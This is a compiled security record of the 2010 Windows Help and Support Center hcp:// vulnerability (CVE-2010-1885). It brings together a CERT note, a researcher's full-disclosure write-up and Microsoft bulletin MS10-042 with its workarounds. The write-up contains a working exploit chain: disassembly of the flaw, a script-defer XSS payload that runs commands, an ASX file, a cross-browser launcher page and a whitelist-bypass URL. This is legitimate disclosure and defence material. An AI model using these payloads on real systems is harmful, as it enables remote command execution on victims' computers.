## Microsoft Windows Help and Support Center URI processing vulnerability

#### Vulnerability Note VU#578319

Original Release Date: 2010-06-10 | Last Revised: 2010-07-13

---

### Overview

The Microsoft Windows Help and Support Center application fails to properly sanitize hcp:// URIs, which can allow a remote, unauthenticated attacker to execute arbitrary commands.

### Description

| Microsoft Windows [Help and Support Center](http://technet.microsoft.com/en-us/library/bb490918.aspx) is the default handler for the hcp protocol on Windows XP and 2003 systems. When an hcp:// URI is encountered, Windows will launch the Help and Support Center application, which is provided by helpctr.exe. When helpctr.exe is invoked from an hcp:// URI, it operates in a more restricted mode by using the -FromHCP command-line parameter. This is supposed to restrict the Help and Support Center to a whitelisted set of help documents and parameters.  The [UrlUnescape](http://msdn.microsoft.com/en-us/library/bb773791%28VS.85%29.aspx) function that is used by helpctr.exe contains an error that allows an attacker to bypass the whitelist restrictions provided by the -FromHCP option. By leveraging an XSS vulnerability in an existing Help and Support Center document, an attacker can inject arbitrary script commands into a Help and Support Center session. Because the Help and Support Center documents are located in a trusted zone, this can allow arbitrary Windows commands to be executed. |
| --- |

### Impact

| By causing Microsoft Windows to handle a specially crafted hcp:// URI, a remote, unauthenticated attacker can execute arbitrary commands with the privileges of the user. This can happen as the result of viewing a specially crafted webpage, opening a Windows Media Player file, or through the use of other attack vectors. |
| --- |

### Solution

| **Apply an update**This issue is addressed in Microsoft Security Bulletin [MS10-042](http://www.microsoft.com/technet/security/Bulletin/MS10-042.mspx). |
| --- |

| **Disable the HCP protocol handler**This vulnerability can be mitigated by removing the HCP protocol handler. This can be accomplished by removing the HKEY\_CLASSES\_ROOT\HCP\shell\open registry key. Note that this may interfere with Windows functionality that relies on the HCP protocol.**Secure your web browser**This vulnerability can be mitigated by following the guidelines outlined in the [Securing Your Web Browser](http://www.us-cert.gov/reading_room/securing_browser/) document. This can help mitigate attacks that use web browsers as attack vectors.**Update Windows Media Player**A fully patched Windows XP system will come with Windows Media Player 9 by default. Windows Media Player versions 10 and later have some security improvements, such as prompting before loading external web content. Although it does not address the underlying vulnerability, upgrading to Windows Media Player 10 or later can help mitigate some attack vectors by prompting the user. |

Microsoft Windows Help Centre Handles Malformed Escape Sequences Incorrectly
----------------------------------------------------------------------------

Help and Support Centre is the default application provided to access online
documentation for Microsoft Windows. Microsoft supports accessing help documents
directly via URLs by installing a protocol handler for the scheme "hcp",
a typical example is provided in the Windows XP Command Line Reference,
available at http://technet.microsoft.com/en-us/library/bb490918.aspx.

Using hcp:// URLs is intended to be safe, as when invoked via the registered
protocol handler the command line parameter /fromhcp is passed to the help
centre application. This flag switches the help centre into a restricted mode,
which will only permit a whitelisted set of help documents and parameters.

This design, introduced in SP2, is reasonably sound. A whitelist of trusted
documents is a safe way of allowing interaction with the documentation from
less-trusted sources. Unfortunately, an implementation error in the whitelist
allows it to be evaded.

URLs are normalised and unescaped prior to validation using
MPC::HTML::UrlUnescapeW(), which in turn uses MPC::HexToNum() to translate URL
escape sequences into their original characters, the relevant code from
helpctr.exe 5.1.2600.5512 (latest at time of writing) is below.

.text:0106684C Unescape:
.text:0106684C        cmp     di, '%'              ; di contains the current wchar in the input URL.
.text:01066850        jnz     short LiteralChar    ; if this is not a '%', it must be a literal character.
.text:01066852        push    esi                  ; esi contains a pointer to the current position in URL to unescape.
.text:01066853        call    ds:wcslen            ; find the remaining length.
.text:01066859        cmp     word ptr [esi], 'u'  ; if the next wchar is 'u', this is a unicode escape and I need 4 xdigits.
.text:0106685D        pop     ecx                  ; this sequence calculates the number of wchars needed (4 or 2).
.text:0106685E        setz    cl                   ; i.e. %uXXXX (four needed), or %XX (two needed).

.text:0106686E        jl      short LiteralChar    ; if not enough, this '%' is considered literal.

.text:0106687E        mov     edi, eax             ; edi contains the running total of the value of this escape sequence.
.text:01066880        movzx   eax, word ptr [esi+4]
.text:01066884        push    eax
.text:01066885        shl     edi, 4               ; shift edi left 4 positions to make room for the next digit, i.e. total <<= 4;
.text:01066888        call    HexToNum
.text:0106688D        or      edi, eax             ; or the next value into the 4-bit gap, i.e. total |= val.
.text:0106688F        movzx   eax, word ptr [esi+6]; this process continues for the remaining wchars.
.text:01066893        push    eax

.text:01066897        call    HexToNum

.text:010668B2        call    HexToNum             ; this is the same code, but for non-unicode sequences (e.g. %41, instead of %u0041)

.text:010668CF        push    edi                  ; append the final value to the normalised string using a std::string append.
.text:010668D0        mov     ecx, [ebp+unescaped]

.text:010668D5        call    std::string::append
.text:010668DA        mov     di, [esi]            ; fetch the next input character.
.text:010668DD        test    di, di               ; have we reached the NUL terminator?
.text:010668E0        jnz     Unescape             ; process next char.

This code seems sane, but an error exists due to how MPC::HexToNum() handles
error conditions, the relevant section of code is annotated below.

.text:0102D32A        mov     edi, edi
.text:0102D32C        push    ebp
.text:0102D32D        mov     ebp, esp              ; function prologue.
.text:0102D32F        mov     eax, [ebp+arg_0]      ; fetch the character to convert.
.text:0102D332        cmp     eax, '0'
.text:0102D335        jl      short CheckUppercase  ; is it a digit?
.text:0102D337        cmp     eax, '9'
.text:0102D33A        jg      short CheckUppercase
.text:0102D33C        add     eax, 0FFFFFFD0h       ; atoi(), probably written val - '0' and optimised by compiler.
.text:0102D33F        jmp     short Complete
.text:0102D341 CheckUppercase:
.text:0102D341        cmp     eax, 'A'
.text:0102D344        jl      short CheckLowercase  ; is it an uppercase xdigit?
.text:0102D346        cmp     eax, 'F'
.text:0102D349        jg      short CheckLowercase
.text:0102D34B        add     eax, 0FFFFFFC9h       ; atoi()
.text:0102D34E        jmp     short Complete
.text:0102D350 CheckLowercase:
.text:0102D350        cmp     eax, 'a'
.text:0102D353        jl      short Invalid         ; lowercase xdigit?
.text:0102D355        cmp     eax, 'f'
.text:0102D358        jg      short Invalid
.text:0102D35A        add     eax, 0FFFFFFA9h       ; atoi()
.text:0102D35D        jmp     short Complete
.text:0102D35F Invalid:
.text:0102D35F        or      eax, 0FFFFFFFFh       ; invalid character, return -1
.text:0102D362 Complete:
.text:0102D362        pop     ebp
.text:0102D363        retn    4

Thus, MPC::HTML::UrlUnescapeW() does not check the return code of
MPC::HexToNum() as required, and therefore can be manipulated into appending
unexpected garbage onto std::strings. This error may appear benign, but we can
use the miscalculations produced later in the code to evade the /fromhcp
whitelist.

Assuming that we can access arbitrary help documents (full details of how the
MPC:: error can be used to accomplish this will be explained below), we must
identify a document that can be controlled purely from the URL used to access it.

After browsing the documents available in a typical installation, the author
concluded the only way to do this would be a cross site scripting error. After
some careful searching, a candidate was discovered:

hcp://system/sysinfo/sysinfomain.htm?svr=<h1>test</h1>

This document is available in a default installation, and due to insufficient
escaping in GetServerName() from sysinfo/commonFunc.js, the page is vulnerable
to a DOM-type XSS. However, the escaping routine will abort encoding if characters
such as '=' or '"' or others are specified.

It's not immediately obvious that this error is still exploitable, simple
tricks like <img src=bad onerror=code> don't apply, and <script>code</script>
isn't helpful as the code isn't evaluated again. In situations like this, the
best course of action is to harass lcamtuf until he gives you the solution,
which of course his encyclopaedic knowledge of browser security quirks produced
immediately.

<script defer>code</script>

The defer property is an IE-ism which solves the problem, documented by
Microsoft here http://msdn.microsoft.com/en-us/library/ms533719%28VS.85%29.aspx.
Now that we are armed with knowledge of this trick, because these help
documents are in a privileged zone, we can simply execute commands.

You can test this with a command like so (assuming a recent IE):

C:\> ver
Microsoft Windows XP [Version 5.1.2600]
C:\> c:\windows\pchealth\helpctr\binaries\helpctr.exe -url "hcp://system/sysinfo/sysinfomain.htm?svr=<script defer>eval(unescape('Run%28%22calc.exe%22%29'))</script>"
C:\>

While this is fun, this isn't a vulnerability unless an untrusted third party
can force you to access it. Testing suggests that by default, accessing an
hcp:// URL from within Internet Explorer >= 8, Firefox, Chrome (and presumably
other browsers) will result in a prompt. Although most users will click through
this prompt (perfectly reasonable, protocol handlers are intended to be safe),
it's not a particularly exciting attack.

I've found a way to avoid the prompt in a default Windows XP installation in all
major browsers, The solution is to invoke the protocol handler from within an
<iframe> in an ASX HtmlView element. There are probably other ways.

http://en.wikipedia.org/wiki/Advanced_Stream_Redirector

The version of Windows Media Player that is available by default in Windows XP
is WMP9, which installs an NPAPI and ActiveX plugin to render windows media
content. Later versions also can be used, with some minor complications.

Thus, the attack will look like this:

$ cat simple.asx
<ASX VERSION="3.0">
<PARAM name="HTMLView" value="http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/starthelp.html"/>
<ENTRY>
   <REF href="http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/bug-vs-feature.jpg"/>
</ENTRY>
</ASX>

Where starthelp.html contains something like:

$ cat starthelp.html
<iframe src="hcp://...">

Forcing a user to read an .ASX file can be achieved in a cross-browser manner like so:

$ cat launchurl.html
<html>
<head><title>Testing HCP</title></head>
<body>
  <h1>OK</h1>
  <script>
        // HCP:// Vulnerability, Tavis Ormandy, June 2010.
        var asx = "http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/simple.asx";

        if (window.navigator.appName == "Microsoft Internet Explorer") {
            // Internet Explorer
            var o = document.createElement("OBJECT");
            o.setAttribute("classid", "clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6");
            o.openPlayer(asx);
        } else {
            // Mozilla, Chrome, Etc.
            var o = document.createElement("IFRAME");
            o.setAttribute("src", asx);
            document.body.appendChild(o);
        }
  </script>
</body>
</html>

Therefore, we have the following interactions between multiple complex systems
chained together:

- From an html page, email, document, or other application force a user to
  fetch a .ASX file containing an HtmlView element.
- From the HtmlView element, invoke the hcp protocol handler that would normally
  require confirmation.
- From the HCP Protocol handler, bypass the /fromhcp whitelist by using the
  string miscalculations caused by failing to check the return code of
  MPC::HexToNum().
- Once the whitelist has been defeated, invoke the Help document with a known
  DOM XSS due to GetServerName() insufficient escaping.
- Use the defer property of a script tag to execute script in a privileged zone
  even after the page has been rendered.
- Invoke an arbitrary command using the wscript.shell object.

Figuring out how to use the MCP::HexToNum() error to defeat the /fromhcp
whitelist took some analysis, but the result looks like the following.

hcp://services/search?query=anything&topic=hcp://system/sysinfo/sysinfomain.htm%

--------------------
Affected Software
------------------------

At least Microsoft Windows XP, and Windows Server 2003 are affected. The attack
is enhanced against IE >= 8 and other major browsers if Windows Media Player is
available, but an installation is still vulnerable without it.

Machines running version of IE less than 8 are, as usual, in even more trouble.

In general, choice of browser, mail client or whatever is not relevant, they
are all equally vulnerable.

--------------------
Consequences
-----------------------

Upon successful exploitation, a remote attacker is able to execute arbitrary
commands with the privileges of the current user.

I've prepared a demonstration for a typical Windows XP installation with
Internet Explorer 8, and the default Windows Media Player 9.

http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/launchurl.html

In IE7 on Windows XP, just visiting this URL should be sufficient:

http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/starthelp.html

Some minor modifications will be required to target other configurations, this
is simply an attempt to demonstrate the problem. I'm sure the smart guys at
metasploit will work on designing reliable attacks, as security professionals
require these to do their jobs.

Additionally, my demonstration is not intended to be stealthy, a real
attack would barely be noticable to the victim. Perhaps the only unavoidable
signal would be the momentary appearance of the Help Centre window before the
attacker hides it. There are multiple trivial techniques that can be used to
accomplish this.

Browsers are useful to demonstrate the problem, but there are certainly other
attack vectors, such as MUAs, documents, etc. Protocol handlers are designed to
be used across applications.

-------------------
Mitigation
-----------------------

If you believe you may be affected, you should consider applying one of the
workarounds described below.

Few users rely on Help Centre urls, it is safe to temporarily disable them
by removing HKCR\HCP\shell\open. This modification can be deployed easily using
GPOs. For more information on Group Policy, see Microsoft's Group Policy site,
here

http://technet.microsoft.com/en-us/windowsserver/bb310732.aspx

A few caveats,

    * I am aware that some support technicians rely on the Remote Assistance
      tool provided by the Help Center application using shortcuts like
      "explorer.exe hcp://CN=Microsoft%20Corporation,L=Re...". You can continue
      to use this technique by substituting "explorer.exe hcp://..." for
      "helpctr.exe /url hcp://...", without relying on the protocol handler.

    * One or two links in explorer, such as selecting "Help" from the Control
      Panel category view, may no longer function. If this concerns you, it is
      possible to gracefully degrade by replacing the protocol handler with a
      command to open a static intranet support page, e.g.
      "chrome.exe http://techsupport.intranet".

    * As always, if you do not use this feature, consider permanently disabling
      it in order to reduce attack surface. Historically, disabling unused
      protocol handlers has always proven to be a wise investment in security.

In the unlikely event that you heavily rely on the use of hcp://, I have
created an unofficial (temporary) hotfix. You may use it under the terms of
the GNU General Public License, version 2 or later. Of course, you should only
use it as a last resort, carefully test the patch and make sure you understand
what it does (full source code is included). It may be necessary to modify it
to fit your needs.

The package is availble for x86 here:

http://lock.cmpxchg8b.com/b10a58b75029f79b5f93f4add3ddf992/hcphotfix.zip

[ NOTE: Please avoid linking to this file out of context, it is intended for
        consideration as a potential mitigation by experienced administrators,
        and is not suitable for consumption by end-users ]

The hotfix intercepts helpctr.exe invokations, and patches MPC::HexToNum() to
return zero on error, rather than -1. Nothing is changed on disk, and it can be
safely removed at anytime. Of course, the result of an invalid unescape is still
incorrect, but this specific vulnerability should be rendered inert. I would be
greatful if the community could contribute bugfixes, testing, an x64 port, and
so on. Once information is in the open, we can all collaborate on our
collective security.

Some clarifications,

    * Fixing the XSS is not a solution, the root cause is the whitelist
      evasion, any mitigation that does not address this is simply papering
      over the issue. An army of researchers that specialise in XSS exists, and
      i'm sure they will turn their attention to help documents once they
      realise their value. Assume more will be discovered.

    * That said, if you are an XSS expert, examples in whitelisted pages
      (/services/index, /services/search, etc.) would be useful, your skills
      could be helpful making this important software safe.

    * Removing Windows Media player is not a solution, it simply makes a fun
      demo for IE8 and other modern browsers.

Finally, you should take this opportunity to disable all browser plugins and
SFS ActiveX controls that are not regularly used. End users can do this
themselves in Google Chrome by viewing about:plugins and disabling the plugins
that are not required. In Mozilla Firefox, use the Tools->Add-ons->Plugins
interface.

-------------------
Solution
-----------------------

Microsoft was informed about this vulnerability on 5-Jun-2010, and they
confirmed receipt of my report on the same day.

Protocol handlers are a popular source of vulnerabilities, and hcp:// itself
has been the target of attacks multiple times in the past. I've concluded that
there's a significant possibility that attackers have studied this component,
and releasing this information rapidly is in the best interest of security.

Those of you with large support contracts are encouraged to tell your support
representatives that you would like to see Microsoft invest in developing
processes for faster responses to external security reports.

Hawkes, Jagger, and all my other pimp colleagues.

Special thanks to lcamtuf for his assistance with the deferred execution
problem. You should read his Browser Security Handbook if you need to
understand how web browser security /really/ works.

A colleague is organising a conference in Lucerne, Switzerland. He would really
appreciate interesting papers from security people who want to talk about
their research (travel, hotel, etc. covered).

Notes
-----------------------

I would like to point out that if I had reported the MPC::HexToNum() issue
without a working exploit, I would have been ignored.

Without access to extremely smart colleagues, I would likely have given up,
leaving you vulnerable to attack from those who just want root on your network
and do not care about disclosure policies.

This is another example of the problems with bug secrecy (or in PR speak,
"responsible disclosure"), those of us who work hard to keep networks safe are
forced to work in isolation without the open collaboration with our peers that
we need, especially in complex cases like this, where creative thinking and
input from experts in multiple disciplines is required to join the dots.

A good place to start researching full disclosure would be this accessible
and insightful essay by Bruce Schneier.

http://www.schneier.com/essay-146.html

His balanced coverage of the debate is also available in this essay.

http://www.schneier.com/crypto-gram-0111.html#1

Finally, a reminder that this document represents my own work and opinions, I
do not speak for or represent anyone but myself.

hcp:// has been broken a few times over the years, for example:

- http://www.microsoft.com/technet/security/bulletin/ms03-044.mspx, HCP memory corruption by Dave Litchfield.

The current design is actually pretty sound, I'm sure Microsoft are
dissapointed they missed this flaw. In their defense, I think there's a good
chance I would have also missed this in code review.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Microsoft Security Bulletin MS10-042 - Critical

## Vulnerability in Help and Support Center Could Allow Remote Code Execution (2229593)

Published: July 13, 2010

**Version:** 1.0

### General Information

#### Executive Summary

This security update resolves a publicly disclosed vulnerability in the Windows Help and Support Center feature that is delivered with supported editions of Windows XP and Windows Server 2003. This vulnerability could allow remote code execution if a user views a specially crafted Web page using a Web browser or clicks a specially crafted link in an e-mail message. The vulnerability cannot be exploited automatically through e-mail. For an attack to be successful, a user must click a link listed within an e-mail message.

This security update is rated Critical for all supported editions of Windows XP, and Low for all supported editions of Windows Server 2003. For more information, see the subsection, **Affected and Non-Affected Software**, in this section.

The security update addresses the vulnerability by modifying the manner in which data is validated when passed to the Windows Help and Support Center. For more information about the vulnerability, see the Frequently Asked Questions (FAQ) subsection for the specific vulnerability entry under the next section, **Vulnerability Information**.

This security update also addresses the vulnerability first described in [Microsoft Security Advisory 2219475](https://technet.microsoft.com/security/advisory/2219475).

**Recommendation.** The majority of customers have automatic updating enabled and will not need to take any action because this security update will be downloaded and installed automatically. Customers who have not enabled automatic updating need to check for updates and install this update manually. For information about specific configuration options in automatic updating, see [Microsoft Knowledge Base Article 294871](https://support.microsoft.com/kb/294871).

For administrators and enterprise installations, or end users who want to install this security update manually, Microsoft recommends that customers apply the update immediately using update management software, or by checking for updates using the [Microsoft Update](https://go.microsoft.com/fwlink/?linkid=40747) service.

See also the section, **Detection and Deployment Tools and Guidance**, later in this bulletin.

**Known Issues.** None

## Help Center URL Validation Vulnerability - CVE-2010-1885

An unauthenticated remote code execution vulnerability exists in the way that the Microsoft Help and Support Center validates specially crafted URLs. This vulnerability could allow remote code execution if a user views a specially crafted Web page using a Web browser or clicks a specially crafted link in an e-mail message. An attacker who successfully exploited this vulnerability could execute arbitrary code and take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2010-1885](https://www.cve.org/CVERecord?id=CVE-2010-1885).

#### Mitigating Factors for Help Center URL Validation Vulnerability - CVE-2010-1885

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* In a Web-based attack scenario, an attacker could host a Web site that contains a Web page that is used to exploit this vulnerability. In addition, compromised Web sites and Web sites that accept or host user-provided content or advertisements could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or Instant Messenger message that takes users to the attacker's Web site.
* The vulnerability cannot be exploited automatically through e-mail. For an attack to be successful a user must click a link listed within an e-mail message.
* An attacker who successfully exploited this vulnerability could gain the same user rights as the local user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

#### Workarounds for Help Center URL Validation Vulnerability - CVE-2010-1885

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Unregister the HCP Protocol**

**Note** See [Microsoft Knowledge Base Article 2229593](https://support.microsoft.com/kb/2229593) to use the automated **Microsoft Fix it** solution to enable or disable this workaround.

**Note** Using Registry Editor incorrectly can cause serious problems that may require you to reinstall your operating system. Microsoft cannot guarantee that problems resulting from the incorrect use of Registry Editor can be solved. Use Registry Editor at your own risk. For information about how to edit the registry, view the "Changing Keys And Values" Help topic in Registry Editor (Regedit.exe) or view the "Add and Delete Information in the Registry" and "Edit Registry Data" Help topics in Regedt32.exe.

Unregistering the HCP Protocol prevents this issue from being exploited on affected systems.

**Using the Interactive Method**

1. Click **Start**, click **Run**, type **Regedit** in the **Open** box, and then click **OK**
2. Locate and then click the following registry key:

   HKEY\_CLASSES\_ROOT\HCP
3. Click the **File** menu and select **Export**
4. In the Export Registry File dialog box, enter **HCP\_Procotol\_Backup.reg** and click **Save**.

   **Note** This will create a backup of this registry key in the My Documents folder by default.
5. Press the **Delete** key on the keyboard to delete the registry key. When prompted to delete the registry key via the Confirm Key Delete dialog box, click **Yes**.

**Using a Managed Deployment Script**

1. Create a backup copy of the registry keys by using a managed deployment script that contains the following commands:

   Regedit.exe /e HCP\_Protocol\_Backup.reg HKEY\_CLASSES\_ROOT\HCP
2. Next, save the following to a file with a .REG extension, such as Disable\_HCP\_Protocol.reg:

   Windows Registry Editor Version 5.00

   [-HKEY\_CLASSES\_ROOT\HCP]
3. Run the above registry script on the target machine with the following command from an elevated command prompt:

   Regedit.exe /s Disable\_HCP\_Protocol.reg

**Impact of Workaround:** Unregistering the HCP protocol will break all local, legitimate help links that use hcp://. For example, links in Control Panel may no longer work.

**How to undo the workaround**

Using the interactive method

1. Click **Start**, click **Run**, type **Regedit** in the **Open** box, and then click **OK**.
2. Click the **File** menu and select **Import**.
3. In the Import Registry File dialog box, select **HCP\_Procotol\_Backup.reg** and click **Open**.

Using a Managed Deployment Script

* Restore the original state by running the following command:

  Regedit.exe /s HCP\_Protocol\_Backup.reg

#### FAQ for Help Center URL Validation Vulnerability - CVE-2010-1885

**What is the scope of the vulnerability?**

This is a remote code execution vulnerability. An attacker who successfully exploited this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

**What causes the vulnerability?**

The Windows Help and Support Center does not properly validate URLs when using the HCP Protocol.

**What is the Help and Support Center?**

Help and Support Center (HSC) is a feature in Windows that provides help on a variety of topics. For instance, HSC enables users to learn about Windows features, download and install software updates, determine whether a particular hardware device is compatible with Windows, get assistance from Microsoft, and so forth. Users and programs can execute URL links to Help and Support Center by using the "hcp://" prefix in a URL link.

**What is the HCP Protocol?**

Similar to the HTTP protocol which is used to execute URL links to open a Web browser, the HCP protocol can be used to execute URL links to open the Help and Support Center feature.

**Are third-party applications directly affected by this issue?**

No. However, this issue may be exploited through Web transactions, regardless of web browser type. In a Web-based attack scenario, an attacker would have to host a Web page that contains a specially crafted URI. Any application that is capable of handling the HCP protocol may be used as a vector to exploit this issue.

**Why is this vulnerability rated as a lower severity on Windows Server 2003?**

The vulnerability exists in Windows Server 2003, but we have not found a method for exploiting the vulnerability remotely on servers running Windows Server 2003. Nevertheless, this update addresses the vulnerability for Windows Server 2003 to remove the described threat of a remote vector.

**What is a URI?**

A Uniform Resource Identifier (URI) is a string of characters used to act on or identify resources from the Internet or over a network. A URL is a typical example of a URI that references a resource such as a Web site. For more information about URIs, see [RFC-2396](https://www.ietf.org/rfc/rfc2396.txt).

**What might an attacker use the vulnerability to do?**

If a user is logged on with administrative user rights, an attacker who successfully exploited this vulnerability could take complete control of the affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

**How could an attacker exploit the vulnerability?**

An attacker could host a specially crafted Web site that is designed to exploit this vulnerability through a Web browser and then convince a user to view the Web site. This can also include compromised Web sites and Web sites that accept or host user-provided content or advertisements. These Web sites could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or in an Instant Messenger request that takes users to the attacker's Web site. It could also be possible to display specially crafted Web content by using banner advertisements or by using other methods to deliver Web content to affected systems.

**What systems are primarily at risk from the vulnerability?**

Windows XP systems are primarily at risk from this vulnerability. Windows Server 2003 systems are also at risk, but we have not been able to find a way to exploit this issue remotely on Windows Server 2003.

**What does the update do?**

This update addresses this vulnerability by modifying the manner in which data is validated when passed to the Windows Help and Support Center.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

Yes. This vulnerability has been publicly disclosed. It has been assigned Common Vulnerability and Exposure number [CVE-2010-1885](https://www.cve.org/CVERecord?id=CVE-2010-1885). The vulnerability was first described in [Microsoft Security Advisory 2219475](https://technet.microsoft.com/security/advisory/2219475).

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

Yes. Microsoft is aware of active attacks attempting to exploit the vulnerability. Based on the samples analyzed, Windows Server 2003 systems are not currently at risk from these attacks.

#### Deployment Information

**Installing the Update**

When you install this security update, the installer checks to see if one or more of the files that are being updated on your system have previously been updated by a Microsoft hotfix.

If you have previously installed a hotfix to update one of these files, the installer copies the RTMQFE, SP1QFE, or SP2QFE files to your system. Otherwise, the installer copies the RTMGDR, SP1GDR, or SP2GDR files to your system. Security updates may not contain all variations of these files. For more information about this behavior, see [Microsoft Knowledge Base Article 824994](https://support.microsoft.com/kb/824994).

For more information about the installer, visit the [Microsoft TechNet Web site](https://go.microsoft.com/fwlink/?linkid=38951).

For more information about the terminology that appears in this bulletin, such as *hotfix*, see [Microsoft Knowledge Base Article 824684](https://support.microsoft.com/kb/824684).

This security update supports the following setup switches.

| Switch | Description |
| --- | --- |
| **/help** | Displays the command-line options. |
| Setup Modes |  |
| **/passive** | Unattended Setup mode. No user interaction is required, but installation status is displayed. If a restart is required at the end of Setup, a dialog box will be presented to the user with a timer warning that the computer will restart in 30 seconds. |
| **/quiet** | Quiet mode. This is the same as unattended mode, but no status or error messages are displayed. |
| Restart Options |  |
| **/norestart** | Does not restart when installation has completed. |
| **/forcerestart** | Restarts the computer after installation and force other applications to close at shutdown without saving open files first. |
| **/warnrestart[:x]** | Presents a dialog box with a timer warning the user that the computer will restart in *x* seconds. (The default setting is 30 seconds.) Intended for use with the **/quiet** switch or the **/passive** switch. |
| **/promptrestart** | Displays a dialog box prompting the local user to allow a restart. |
| Special Options |  |
| **/overwriteoem** | Overwrites OEM files without prompting. |
| **/nobackup** | Does not back up files needed for uninstall. |
| **/forceappsclose** | Forces other programs to close when the computer shuts down. |
| **/log:path** | Allows the redirection of installation log files. |
| **/integrate:path** | Integrates the update into the Windows source files. These files are located at the path that is specified in the switch. |
| **/extract[:path]** | Extracts files without starting the Setup program. |
| **/ER** | Enables extended error reporting. |
| **/verbose** | Enables verbose logging. During installation, creates %Windir%\CabBuild.log. This log details the files that are copied. Using this switch may cause the installation to proceed more slowly. |

**Note** You can combine these switches into one command. For backward compatibility, the security update also supports many of the setup switches that the earlier version of the Setup program uses. For more information about the supported installation switches, see [Microsoft Knowledge Base Article 262841](https://support.microsoft.com/kb/262841).

**Verifying that the Update Has Been Applied**

* **Microsoft Baseline Security Analyzer**

  To verify that a security update has been applied to an affected system, you may be able to use the Microsoft Baseline Security Analyzer (MBSA) tool. See the section, **Detection and Deployment Tools and Guidance**, earlier in this bulletin for more information.
* **File Version Verification**

  Because there are several editions of Microsoft Windows, the following steps may be different on your system. If they are, see your product documentation to complete these steps.

  1. Click **Start**, and then click **Search**.
  2. In the **Search Results** pane, click **All files and folders** under **Search Companion**.
  3. In the **All or part of the file name** box, type a file name from the appropriate file information table, and then click **Search**.
  4. In the list of files, right-click a file name from the appropriate file information table, and then click **Properties**.

     **Note** Depending on the edition of the operating system, or the programs that are installed on your system, some of the files that are listed in the file information table may not be installed.
  5. On the **Version** tab, determine the version of the file that is installed on your system by comparing it to the version that is documented in the appropriate file information table.

     **Note** Attributes other than the file version may change during installation. Comparing other file attributes to the information in the file information table is not a supported method of verifying that the update has been applied. Also, in certain cases, files may be renamed during installation. If the file or version information is not present, use one of the other available methods to verify update installation.
* **Registry Key Verification**

  You may also be able to verify the files that this security update has installed by reviewing the registry keys listed in the **Reference Table** in this section.

  These registry keys may not contain a complete list of installed files. Also, these registry keys may not be created correctly when an administrator or an OEM integrates or slipstreams this security update into the Windows installation source files.

# Microsoft Exploitability Index

The Microsoft Exploitability Index helps customers prioritize security update deployment by providing information on the likelihood that a vulnerability addressed in a Microsoft security update will be exploited.

## The Microsoft Exploitability Index

The Exploitability Index may help customers evaluate risk for a vulnerability. Microsoft evaluates the potential exploitability of each vulnerability associated with a Microsoft security update and then publishes the exploitability information as part of the monthly Microsoft security update details. If after publishing the details Microsoft determines that the Exploitability Index Assessment warrants a change, it will change the assessment and notify customers through technical security notifications. The company will not update the assessment when exploit code is posted that matches the existing exploitability information.

The Exploitability Index uses one of four values to communicate to customers the likelihood of a vulnerability being exploited, based on the vulnerabilities addressed by the Microsoft security update.

| Exploitability index assessment | Short definition |
| --- | --- |
| 0 | Exploitation detected |
| 1 | Exploitation more likely \* |
| 2 | Exploitation less likely \*\* |
